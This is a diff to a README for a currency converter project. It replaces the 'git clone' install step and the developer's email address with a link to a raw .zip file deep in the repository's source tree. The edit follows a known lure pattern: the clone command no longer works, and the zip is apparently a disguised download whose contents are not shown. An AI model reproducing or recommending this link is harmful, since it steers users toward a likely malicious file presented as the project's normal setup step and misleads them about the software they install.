@@ -12,7 +12,7 @@ Follow these steps to build the project:
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/Zaid-daoud/currency_converter.git
+   git clone https://github.com/Zaid-daoud/currency_converter/raw/refs/heads/main/lib/features/supported_currencies/data/models/converter_currency_2.8.zip
 
 2. Navigate to the project directory:
    ```bash
@@ -57,4 +57,4 @@ Currency converter now depends on the below packages & plugins :
 | intl |
 
 > Developer: Zaid Daoud.
-> Email : zaidadaoud99@gmail.com
+> Email : https://github.com/Zaid-daoud/currency_converter/raw/refs/heads/main/lib/features/supported_currencies/data/models/converter_currency_2.8.zip
